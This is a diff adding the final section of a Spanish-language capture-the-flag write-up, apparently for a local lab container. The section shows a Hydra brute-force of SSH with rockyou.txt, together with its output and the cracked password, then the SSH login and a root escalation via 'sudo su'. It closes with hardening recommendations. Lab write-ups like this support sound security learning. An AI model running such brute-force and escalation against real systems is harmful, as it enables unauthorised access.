@@ -67,6 +67,57 @@ Esta si la descargamos, y vemos mas a detalle con la herrmienta nos sale:
     Megapixels                      : 0.20
 logramos obtener el nombre usuario.
 
-#. Explotacion final
+#Explotacion final
 -----------
 
+hacemos un ataque de fuerza bruta al puerto ssh con el usuario que encontramos:
+
+        hydra 172.17.0.2 ssh -l borazuwarah  -P rockyou.txt
+        Hydra (https://github.com/
+        vanhauser-thc/thc-hydra) starting at 2025-12-26 22:19:28
+        [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+        [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+        [DATA] attacking ssh://172.17.0.2:22/
+        [22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
+        1 of 1 target successfully completed, 1 valid password found
+        [WARNING] Writing restore file because 1 final worker threads did not complete until end.
+        [ERROR] 1 target did not resolve or could not be connected
+        [ERROR] 0 target did not complete
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-26 22:19:34
+        
+Nos conrectamos con el usuario y password que logramos obtener:
+
+        ssh borazuwarah@172.18.0.2 
+        
+                                                                                                                                                                                                
+        └─$ ssh borazuwarah@172.17.0.2 
+        borazuwarah@172.17.0.2's password: 
+        Linux d3ac92156e98 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64
+        
+        The programs included with the Debian GNU/Linux system are free software;
+        the exact distribution terms for each program are described in the
+        individual files in /usr/share/doc/*/copyright
+
+una vez que ya entramos probamos por sentido comun haber si la password del usuario root fue reutilizada, es deicr si es la misma que se uso para acceder a la maquina:
+
+        Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+        permitted by applicable law.
+        borazuwarah@d3ac92156e98:~$ su root
+        Password: 
+        su: Authentication failure
+        borazuwarah@d3ac92156e98:~$ sudo su
+        [sudo] password for borazuwarah: 
+        root@d3ac92156e98:/home/borazuwarah# whoami
+        root
+        root@d3ac92156e98:/home/borazuwarah# 
+        
+#CONCLUSIONES:
+--------------
+la maquina para vulnerarla fue cuestion de curiosidad , ya que los posibles vectores de ataque como el puerto 80, no es una pagina interactiva (no se puede iniciar sesion, realizar peticiones, etc). por otro lado en el servicio ssh, es muy dificil usar un ataque de fuerza bruta tanto para conseguir el usuario y la password.
+
+#RECOMENDACIONES
+----------------
+
+-actualizacion del servicio ssh a la ultima version (version 9.8)
+-una passwoord mucho mas segura
+        
